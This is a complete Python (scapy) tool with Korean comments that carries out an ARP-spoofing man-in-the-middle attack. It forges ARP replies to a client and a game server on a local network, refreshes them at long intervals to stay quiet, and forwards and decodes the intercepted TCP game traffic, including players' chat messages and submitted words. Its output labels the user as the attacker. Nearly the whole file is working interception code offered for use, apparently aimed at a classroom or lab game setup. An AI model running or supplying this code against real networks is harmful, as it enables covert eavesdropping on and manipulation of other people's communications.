#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🚀 고급 ARP 스푸핑 + IP 포워딩 도구 (중복 패킷 필터링 적용)
- 효율적인 ARP 스푸핑 (버스트 + 유지보수)
- 패킷 포워딩으로 게임 데이터 인터셉트
- 중복 패킷 자동 필터링으로 깔끔한 출력
"""

import time
import threading
import subprocess
import json
import re
import hashlib
from scapy.all import *
import platform
import sys
from scapy.all import *
import json
import re

# 네트워크 설정
TARGET_IP = "172.30.1.87"          # 클라이언트 IP
GATEWAY_IP = "172.30.1.254"        # 게이트웨이 IP  
SERVER_IP = "172.30.1.42"          # 서버 IP
TARGET_PORT = 8080                 # 게임 포트

class OptimizedForwarder:
    def __init__(self):
        self.target_mac = None
        self.gateway_mac = None
        self.server_mac = None
        self.my_mac = None
        self.my_ip = None
        self.spoofing = False
        self.packet_count = 0
        self.game_packet_count = 0
        
        # 🚀 중복 패킷 필터링을 위한 추가 변수들
        self.seen_packets = set()  # 중복 패킷 체크용
        self.last_game_data = {}   # 마지막 게임 데이터 저장
        self.packet_timeout = 5    # 중복 체크 타임아웃 (초)
        
    def get_my_info(self):
        """내 IP와 MAC 주소 획득"""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.my_ip = s.getsockname()[0]
            s.close()
            
            self.my_mac = get_if_hwaddr(conf.iface)
            
            print(f"[+] 공격자 IP: {self.my_ip}")
            print(f"[+] 공격자 MAC: {self.my_mac}")
            return True
        except Exception as e:
            print(f"[-] 내 정보 획득 실패: {e}")
            return False
    
    def get_mac_addresses(self):
        """필요한 MAC 주소들 획득"""
        print("[+] MAC 주소 수집 중...")
        
        # 타겟 MAC
        print(f"   타겟 {TARGET_IP} 검색 중...")
        arp_request = ARP(pdst=TARGET_IP)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]
        
        if answered_list:
            self.target_mac = answered_list[0][1].hwsrc
            print(f"   ✅ 타겟 MAC: {self.target_mac}")
        else:
            print(f"   ❌ 타겟 MAC 찾기 실패")
            return False
        
        # 서버 MAC
        print(f"   서버 {SERVER_IP} 검색 중...")
        arp_request = ARP(pdst=SERVER_IP)
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]
        
        if answered_list:
            self.server_mac = answered_list[0][1].hwsrc
            print(f"   ✅ 서버 MAC: {self.server_mac}")
        else:
            print(f"   ❌ 서버 MAC 찾기 실패")
            return False
        
        return True
    
    def start_minimal_arp_spoofing(self):
        """최소한의 ARP 스푸핑 (TCP DUP 방지)"""
        print("[+] 최적화된 ARP 스푸핑 시작...")
        
        # 🚀 초기 강화 스푸핑 (한 번만)
        print("[+] 초기 ARP 테이블 설정 중...")
        for i in range(3):
            packet1 = Ether(dst=self.target_mac) / ARP(
                op=2, pdst=TARGET_IP, hwdst=self.target_mac,
                psrc=SERVER_IP, hwsrc=self.my_mac
            )
            packet2 = Ether(dst=self.server_mac) / ARP(
                op=2, pdst=SERVER_IP, hwdst=self.server_mac,
                psrc=TARGET_IP, hwsrc=self.my_mac
            )
            sendp([packet1, packet2], verbose=False)
            print(f"   📤 초기 설정 {i+1}/3")
            time.sleep(1)
        
        print("[+] 초기 설정 완료. 이제 저빈도 유지 모드로 전환...")
        
        self.spoofing = True
        
        def spoofing_loop():
            packet_count = 0
            while self.spoofing:
                try:
                    # 서버-클라이언트 간 직접 통신만 가로채기
                    # 1. 타겟에게: 서버가 우리라고 속임
                    packet1 = Ether(dst=self.target_mac) / ARP(
                        op=2, pdst=TARGET_IP, hwdst=self.target_mac,
                        psrc=SERVER_IP, hwsrc=self.my_mac
                    )
                    
                    # 2. 서버에게: 타겟이 우리라고 속임  
                    packet2 = Ether(dst=self.server_mac) / ARP(
                        op=2, pdst=SERVER_IP, hwdst=self.server_mac,
                        psrc=TARGET_IP, hwsrc=self.my_mac
                    )
                    
                    # 패킷 전송 (빈도 줄임)
                    sendp([packet1, packet2], verbose=False)
                    
                    packet_count += 1
                    if packet_count % 2 == 0:  # 더 적게 출력
                        print(f"[+] ARP 스푸핑 유지 {packet_count}회 (저빈도 모드)")
                    
                    # 🔥 핵심: 전송 간격을 매우 길게 (TCP DUP 방지)
                    time.sleep(60)  # 10초 → 60초로 대폭 증가
                    
                except Exception as e:
                    print(f"[-] ARP 스푸핑 오류: {e}")
                    time.sleep(60)
        
        self.spoof_thread = threading.Thread(target=spoofing_loop, daemon=True)
        self.spoof_thread.start()
        return True
    
    def analyze_game_packet(self, raw_data, direction):
        """게임 패킷 분석 (필터링 적용)"""
        try:
            text = raw_data.decode('utf-8', errors='ignore')
            
            if '{' in text and '}' in text:
                # JSON 추출
                json_match = re.search(r'\{.*\}', text)
                if json_match:
                    json_str = json_match.group()
                    try:
                        game_data = json.loads(json_str)
                        msg_type = game_data.get('type', '')
                        
                        # 🚀 중복 패킷 필터링
                        current_time = time.time()
                        
                        # 패킷 고유 식별자 생성 (내용 + 방향)
                        packet_id = hashlib.md5(f"{json_str}_{direction}".encode()).hexdigest()
                        
                        # 중복 체크: 최근 5초 내에 같은 패킷이 있었는지 확인
                        current_packet_key = (packet_id, current_time)
                        
                        # 오래된 패킷 기록 정리 (5초 이전 것들 제거)
                        self.seen_packets = {(pid, ptime) for pid, ptime in self.seen_packets 
                                           if current_time - ptime < self.packet_timeout}
                        
                        # 중복 패킷 체크
                        for seen_id, seen_time in self.seen_packets:
                            if seen_id == packet_id and current_time - seen_time < self.packet_timeout:
                                # 중복 패킷 발견! 무시함
                                return False
                        
                        # 새로운 패킷이므로 기록에 추가
                        self.seen_packets.add(current_packet_key)
                        
                        # 게임 관련 메시지만 필터링
                        game_message_types = [
                            'join', 'submit_word', 'word_submitted', 'chat',
                            'game_start', 'game_over', 'player_joined', 'player_left'
                        ]
                        
                        if msg_type in game_message_types:
                            self.game_packet_count += 1
                            timestamp = time.strftime("%H:%M:%S")
                            
                            print(f"\n🕒 [{timestamp}] 🎮 {direction} (#{self.game_packet_count}) [총:{self.packet_count}]")
                            
                            # 메시지 타입별 상세 정보
                            if msg_type == 'join':
                                nickname = game_data.get('nickname', 'Unknown')
                                print(f"   👤 게임 참가: {nickname}")
                            
                            elif msg_type == 'submit_word':
                                word = game_data.get('word', '')
                                print(f"   📝 단어 제출: '{word}'")
                            
                            elif msg_type == 'word_submitted':
                                valid = game_data.get('valid', False)
                                word = game_data.get('word', '')
                                player = game_data.get('player', 'Unknown')
                                status = "✅ 승인" if valid else "❌ 거부"
                                print(f"   🎯 {player}의 단어 '{word}' {status}")
                                if not valid:
                                    message = game_data.get('message', '')
                                    if message:
                                        print(f"      ⚠️ 사유: {message}")
                            
                            elif msg_type == 'chat':
                                sender = game_data.get('sender', 'Unknown')
                                content = game_data.get('content', '')
                                print(f"   💬 {sender}: '{content}'")
                            
                            elif msg_type == 'game_start':
                                start_word = game_data.get('startWord', '')
                                first_turn = game_data.get('firstTurn', '')
                                print(f"   🎯 게임 시작! 시작 단어: '{start_word}', 첫 턴: {first_turn}")
                            
                            elif msg_type == 'game_over':
                                winner = game_data.get('winner', '')
                                loser = game_data.get('loser', '')
                                reason = game_data.get('reason', '')
                                print(f"   🏆 게임 종료! 승자: {winner}, 패자: {loser}")
                                if reason:
                                    print(f"      📋 종료 사유: {reason}")
                            
                            elif msg_type == 'player_joined':
                                nickname = game_data.get('nickname', 'Unknown')
                                print(f"   ➕ 플레이어 입장: {nickname}")
                            
                            elif msg_type == 'player_left':
                                nickname = game_data.get('nickname', 'Unknown')
                                print(f"   ➖ 플레이어 퇴장: {nickname}")
                            
                            print("   " + "-" * 50)
                            return True
                            
                        # 디버깅용: 알 수 없는 메시지 타입 (필요 시 주석 해제)
                        # elif msg_type:
                        #     print(f"   🔍 알 수 없는 메시지: {msg_type}")
                        
                    except json.JSONDecodeError:
                        # JSON 파싱 실패 시 무시
                        pass
                        
        except UnicodeDecodeError:
            # 바이너리 데이터 무시
            pass
        return False
    
    def packet_interceptor(self, packet):
        """개선된 패킷 인터셉터 (중복 방지)"""
        try:
            self.packet_count += 1
            
            # 🔧 통계 출력을 게임 패킷 발견 시에만 표시
            # if self.packet_count % 5000 == 0:  # 필요시 주석 해제 (5000개마다)
            #     print(f"[📊] 총 패킷: {self.packet_count}, 게임 패킷: {self.game_packet_count} (중복 제거됨)")
            
            if packet.haslayer(IP) and packet.haslayer(TCP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                tcp = packet[TCP]
                
                # 서버-클라이언트 간 게임 통신만 처리
                if ((src_ip == TARGET_IP and dst_ip == SERVER_IP) or 
                    (src_ip == SERVER_IP and dst_ip == TARGET_IP)):
                    
                    if tcp.dport == TARGET_PORT or tcp.sport == TARGET_PORT:
                        
                        # 🔥 중요: 패킷 분석 먼저 수행
                        game_packet_detected = False
                        if packet.haslayer(Raw):
                            direction = "클라이언트→서버" if src_ip == TARGET_IP else "서버→클라이언트"
                            game_packet_detected = self.analyze_game_packet(packet[Raw].load, direction)
                        
                        # 패킷 포워딩 (중복 방지를 위해 MAC 주소 변경)
                        if src_ip == TARGET_IP:
                            # 클라이언트→서버
                            new_packet = Ether(dst=self.server_mac, src=self.my_mac) / packet[IP]
                        else:
                            # 서버→클라이언트  
                            new_packet = Ether(dst=self.target_mac, src=self.my_mac) / packet[IP]
                        
                        # 포워딩 (조용히)
                        sendp(new_packet, verbose=False)
                        
                        # 원본 패킷은 더 이상 전송되지 않음 (자동으로 차단됨)
                        
        except Exception as e:
            # 에러 무시
            pass
    
    def start_monitoring(self):
        """패킷 모니터링 시작"""
        print("\n🚀 게임 패킷 모니터링 시작!")
        print("💡 오직 게임 데이터만 표시됩니다 (배경 노이즈 제거)")
        print("🎮 이제 게임을 플레이해보세요!")
        print("=" * 60)
        
        try:
            # 특정 호스트만 필터링하여 부하 감소
            filter_str = f"host {TARGET_IP} and host {SERVER_IP}"
            sniff(filter=filter_str, prn=self.packet_interceptor, store=False)
        except KeyboardInterrupt:
            print("\n[+] 모니터링 중단됨")
    
    def stop(self):
        """정리 작업"""
        print("\n[+] ARP 테이블 복구 중...")
        self.spoofing = False
        
        if self.target_mac and self.server_mac:
            try:
                # 원본 MAC으로 복구
                restore_packets = [
                    Ether(dst=self.target_mac) / ARP(op=2, pdst=TARGET_IP, hwdst=self.target_mac,
                                                    psrc=SERVER_IP, hwsrc=self.server_mac),
                    Ether(dst=self.server_mac) / ARP(op=2, pdst=SERVER_IP, hwdst=self.server_mac,
                                                    psrc=TARGET_IP, hwsrc=self.target_mac)
                ]
                
                for _ in range(3):
                    sendp(restore_packets, verbose=False)
                    time.sleep(1)
                    
                print("[+] ARP 테이블 복구 완료")
            except Exception as e:
                print(f"[-] 복구 중 오류: {e}")

def main():
    print("🔧 TCP 중복 패킷 방지 버전")
    print("=" * 60)
    print(f"🎯 타겟 클라이언트: {TARGET_IP}")
    print(f"🖥️  게임 서버: {SERVER_IP}")
    print("=" * 60)
    
    forwarder = OptimizedForwarder()
    
    try:
        # 1. 내 정보 확인
        if not forwarder.get_my_info():
            return
        
        # 2. MAC 주소 수집
        if not forwarder.get_mac_addresses():
            return
        
        # 3. 최적화된 ARP 스푸핑 시작
        if not forwarder.start_minimal_arp_spoofing():
            return
        
        print("\n[+] 3초 후 모니터링 시작...")
        time.sleep(3)
        
        # 4. 패킷 모니터링 시작
        forwarder.start_monitoring()
        
    except KeyboardInterrupt:
        forwarder.stop()
    except Exception as e:
        print(f"[-] 오류 발생: {e}")
        forwarder.stop()

if __name__ == "__main__":
    main() 